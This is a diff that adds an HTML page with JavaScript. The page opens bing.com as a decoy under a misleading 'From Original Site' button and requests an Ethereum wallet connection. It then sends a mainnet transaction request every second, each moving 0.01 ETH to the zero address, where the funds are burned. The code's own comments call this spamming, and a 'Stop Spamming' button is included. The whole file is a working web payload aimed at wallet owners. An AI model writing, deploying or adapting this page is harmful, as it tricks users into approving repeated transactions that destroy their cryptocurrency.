@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    let spamming = false; // Flag to control the spamming
+
+    async function openBingAndPromptWallet() {
+      // Open bing.com
+      window.open('https://bing.com', 'x');
+
+      // Check for wallet connection
+      await promptWalletConnection();
+
+      // Start spamming Ethereum transactions if wallet is connected
+      if (connected) {
+        spamming = true;
+        spamEthTransactions();
+      }
+    }
+
+    async function promptWalletConnection() {
+      if (typeof window.ethereum !== 'undefined') {
+        try {
+          // Request wallet connection
+          await ethereum.request({ method: 'eth_requestAccounts' });
+          alert('Wallet connected successfully!');
+          connected = true; // Set connected to true after successful connection
+        } catch (error) {
+          alert('Wallet connection request rejected by the user.');
+          connected = false; // Set connected to false on rejection
+        }
+      } else {
+        alert('Web3 (Ethereum provider) is not available in this browser.');
+        connected = false; // Set connected to false if Web3 is not available
+      }
+    }
+
+    async function promptEthTransaction() {
+      try {
+        const transactionParameters = {
+          nonce: "0x00",
+          gasPrice: "0x244AC6D",
+          gas: "0x12A52",
+          to: "0x0000000000000000000000000000000000000000",
+          from: ethereum.selectedAddress,
+          value: "0x2386F26FC10000",
+          data: "0x00",
+          chainId: "0x1",
+        };
+
+        const txHash = await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [transactionParameters],
+        });
+
+        console.log(`Transaction sent: ${txHash}`);
+      } catch (error) {
+        console.error('Ethereum transaction request failed or was rejected.');
+      }
+    }
+
+    function spamEthTransactions() {
+      if (spamming) {
+        promptEthTransaction();
+      }
+    }
+
+    // Start spamming Ethereum transactions every second (1000ms)
+    setInterval(spamEthTransactions, 1000);
+
+    // Function to stop spamming
+    function stopSpamming() {
+      spamming = false;
+    }
+
+    let connected = false; // Initialize connected flag as false
+  </script>
+  <center>
+    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
+    <input type="button" class="button" value="Stop Spamming" onclick="stopSpamming()">
+  </center>
+</body>
+</html>
